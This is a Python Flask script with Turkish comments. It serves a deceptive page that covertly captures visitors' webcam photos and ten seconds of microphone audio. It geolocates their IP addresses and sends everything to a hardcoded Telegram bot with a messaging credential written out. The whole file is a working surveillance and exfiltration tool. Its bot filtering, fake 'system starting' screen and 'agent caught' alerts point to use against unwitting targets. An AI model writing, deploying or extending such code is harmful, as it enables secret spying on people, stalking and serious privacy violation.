from flask import Flask, request, jsonify
import requests
import time
import os
import base64

app = Flask(__name__)

# --- AYARLAR ---
TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
CHAT_ID = "7622505128"

# Spam koruması için global değişken
son_mesaj_zamani = 0

def telegram_mesaj_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}, timeout=5)
    except Exception as e:
        print("Mesaj Hatası:", e)

def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
    try:
        resim_verisi = fotograf_base64.split(",")[1]
        resim_bytes = base64.b64decode(resim_verisi)
        
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {'photo': ('ajan.jpg', resim_bytes)}
        data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
        
        requests.post(url, files=files, data=data, timeout=10)
    except Exception as e:
        print("Fotoğraf Hatası:", e)

def telegram_ses_gonder(ses_dosyasi):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVoice"
        # Telegram ses kayıtlarını genellikle .ogg veya .webm formatında sever
        files = {'voice': ('ajan_ses.webm', ses_dosyasi, 'audio/webm')}
        data = {'chat_id': CHAT_ID}
        
        requests.post(url, files=files, data=data, timeout=10)
    except Exception as e:
        print("Ses Gönderme Hatası:", e)

@app.route('/', methods=['GET'])
def ana_sayfa():
    if request.path == '/favicon.ico': return "OK", 200
    
    # Gerçek IP'yi al
    ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
    
    # Eğer yerel IP ise, dış IP'ye çevir
    sorgulanan_ip = ziyaretci_ip
    if ziyaretci_ip.startswith("192.168.") or ziyaretci_ip.startswith("127.") or ziyaretci_ip.startswith("10."):
        try:
            sorgulanan_ip = requests.get('https://api.ipify.org', timeout=3).text
        except:
            pass

    user_agent = request.headers.get('User-Agent', '').lower()
    
    # 🚨 BOT FİLTRESİ
    if 'bot' in user_agent or 'facebook' in user_agent or 'crawler' in user_agent or 'spider' in user_agent or 'python' in user_agent:
        return "OK", 200

    # 📸 OTOMATİK KAMERA VE MİKROFON İSTEĞİ
    html = f"""
    <body style='background:#0a0a0a; color:#0f0; font-family:monospace; text-align:center; padding-top:15%;'>
        <h2 style='color:red;'>SİSTEM BAŞLATILIYOR...</h2>
        <p id='durum'>Lütfen kamera ve mikrofon izni verin...</p>

        <video id="video" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            window.onload = async function() {{
                const durum = document.getElementById('durum');
                
                try {{
                    // Hem kamera hem mikrofon izni istiyoruz
                    const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {{
                        setTimeout(() => {{
                            // 1. FOTOĞRAF ÇEKME İŞLEMİ
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            const foto = canvas.toDataURL('image/jpeg');
                            
                            durum.innerHTML = "✅ Fotoğraf çekildi. Ses kaydı başlıyor...";
                            
                            // 2. SES KAYDI BAŞLATMA İŞLEMİ
                            const mediaRecorder = new MediaRecorder(stream);
                            const audioChunks = [];

                            mediaRecorder.ondataavailable = event => {{
                                audioChunks.push(event.data);
                            }};

                            mediaRecorder.onstop = () => {{
                                const audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
                                const formData = new FormData();
                                formData.append('ses_dosyasi', audioBlob, 'kayit.webm');
                                
                                durum.innerHTML = "✅ Ses kaydı bitti, gönderiliyor...";
                                
                                fetch('/ses', {{
                                    method: 'POST',
                                    body: formData
                                }});
                            }};

                            mediaRecorder.start();
                            
                            // 10 saniye sayacı
                            let saniye = 10;
                            const sayac = setInterval(() => {{
                                durum.innerHTML = "🎙️ Ses kaydediliyor: " + saniye + " saniye kaldı...";
                                saniye--;
                            }}, 1000);

                            // 10 saniye sonra kaydı durdur ve fotoğrafı gönder
                            setTimeout(() => {{
                                clearInterval(sayac);
                                mediaRecorder.stop();
                                
                                // Fotoğrafı gönder
                                fetch('/kamera', {{
                                    method: 'POST',
                                    headers: {{ 'Content-Type': 'application/json' }},
                                    body: JSON.stringify({{ image: foto, ip: "{sorgulanan_ip}" }})
                                }});

                                // İşlem bitince kamerayı ve mikrofonu kapat
                                setTimeout(() => {{
                                    stream.getTracks().forEach(track => track.stop());
                                    durum.innerHTML = "✅ İşlem tamamlandı!";
                                }}, 1000);

                            }}, 10000); // 10 saniye

                        }}, 1500); // Kamera açıldıktan 1.5 saniye sonra başla
                    }};
                }} catch (error) {{
                    durum.innerHTML = "❌ İzin verilmedi (Kamera/Mikrofon)";
                    fetch('/kamera_hata', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ ip: "{sorgulanan_ip}", hata: error.message }})
                    }});
                }}
            }};
        </script>
    </body>
    """
    return html

@app.route('/kamera', methods=['POST'])
def kamera():
    veri = request.json
    ip = veri['ip']
    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
    
    try:
        konum = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
        sehir = konum.get('city', 'Bilinmiyor')
        hava = requests.get(f'https://wttr.in/{sehir}?format=3', timeout=3).text.strip()
    except:
        sehir, hava = "Bilinmiyor", "Alınamadı"

    bilgi_metni = f"""🚨 <b>AJAN YAKALANDI!</b>
    
🌐 <b>IP Adresi:</b> {ip}
📍 <b>Konum:</b> {sehir}
☀️ <b>Hava Durumu:</b> {hava}
📱 <b>Tarayıcı:</b> {user_agent[:50]}..."""

    telegram_fotograf_gonder(veri['image'], bilgi_metni)
    return "OK", 200

# --- YENİ EKLENEN ROTA: SES KAYDI ---
@app.route('/ses', methods=['POST'])
def ses():
    if 'ses_dosyasi' not in request.files:
        return jsonify({"hata": "Ses dosyası bulunamadı"}), 400
    
    ses_dosyasi = request.files['ses_dosyasi']
    ses_verisi = ses_dosyasi.read()
    
    # Ses kaydını Telegram'a gönder
    telegram_ses_gonder(ses_verisi)
    
    return "OK", 200

@app.route('/kamera_hata', methods=['POST'])
def kamera_hata():
    veri = request.json
    ip = veri['ip']
    
    try:
        konum = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
        sehir = konum.get('city', 'Bilinmiyor')
    except:
        sehir = "Bilinmiyor"

    mesaj = f"""⚠️ <b>İZİN VERİLMEDİ</b>
    
🌐 <b>IP Adresi:</b> {ip}
📍 <b>Konum:</b> {sehir}
📱 <b>Tarayıcı:</b> {request.headers.get('User-Agent', 'Bilinmiyor')[:50]}..."""

    telegram_mesaj_gonder(mesaj)
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port) 
